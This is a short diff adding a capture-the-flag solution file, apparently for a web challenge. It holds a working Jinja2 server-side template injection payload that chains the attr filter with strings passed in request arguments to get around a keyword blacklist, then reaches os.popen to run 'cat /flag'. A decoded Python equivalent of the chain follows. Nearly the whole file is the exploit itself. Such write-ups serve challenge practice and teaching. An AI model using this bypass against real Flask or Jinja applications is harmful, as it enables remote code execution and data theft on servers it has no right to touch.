@@ -1,0 +1,8 @@
+Solution:
+
+{{request|attr(request.args.a)|attr(request.args.b)|attr(request.args.c)(request.args.d)|attr(request.args.c)(request.args.e)(request.args.f)|attr(request.args.g)(request.args.h)|attr(request.args.i)()}}&a=application&b=__globals__&c=__getitem__&d=__builtins__&e=__import__&f=os&g=popen&h=cat /flag&i=read
+
+Idea is that we can use jinja filters to bypass my template injection blacklists. We build strings by grabbing it from request args.
+
+We are encoding this method to get RCE.
+request.application.__globals__.__getitem__("__builtins__").__getitem__("__import__").os.popen("cat /flag").read()
